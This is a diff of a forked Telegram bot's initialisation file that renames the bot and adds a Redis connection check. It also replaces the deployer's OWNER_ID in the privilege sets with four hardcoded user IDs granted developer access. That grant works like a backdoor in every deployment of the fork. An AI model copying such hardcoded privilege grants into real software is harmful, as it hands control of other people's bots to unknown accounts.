@@ -2,8 +2,8 @@
 MIT License
 Copyright (C) 2017-2019, Paul Larsen
 Copyright (C) 2022 Hodacka
-Copyright (c) 2022, Yūki • Black Knights Union, <https://github.com/Hodacka/NekoRobot-3>
-This file is part of @NekoXRobot (Telegram Bot)
+Copyright (c) 2022, Yūki • Black Knights Union, <https://github.com/MrSumit006/NekoRobot-3>
+This file is part of @YorForgerXbot (Telegram Bot)
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the Software), to deal
 in the Software without restriction, including without limitation the rights
@@ -32,6 +32,7 @@ from Python_ARQ import ARQ
 import telegram.ext as tg
 from redis import StrictRedis
 from pyrogram import Client, errors
+from redis import StrictRedis
 from telethon.sessions import MemorySession
 from telethon import TelegramClient
 from aiohttp import ClientSession
@@ -225,9 +226,27 @@ else:
             "Your blacklisted chats list does not contain valid integers.")
 
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1915770303)
+DEV_USERS.add(5396584280)
+DEV_USERS.add(5236400458)
+DEV_USERS.add(2144495178)
 
+
+REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
+
+try:
+
+    REDIS.ping()
+
+    LOGGER.info("[NEKOROBOT]: Connecting To Koyūki • Data Center • Chennai • Redis Database")
+except BaseException:
+
+    raise Exception("[NEKOROBOT ERROR]: Your Koyūki • Data Center • Chennai • Redis Database Is Not Alive, Please Check Again.")
+
+finally:
+
+   REDIS.ping()
+LOGGER.info("[NEKOROBOT]: Connection To The Koyūki • Data Center • Chennai • Redis Database Established Successfully!")
 
 
 if not SPAMWATCH_API:
@@ -301,5 +320,4 @@ from NekoRobot.modules.helper_funcs.handlers import (CustomCommandHandler,
 tg.RegexHandler = CustomRegexHandler
 tg.CommandHandler = CustomCommandHandler
 tg.MessageHandler = CustomMessageHandler
-
-LOGGER.info("[NEKOROBOT IS READY]")
+    
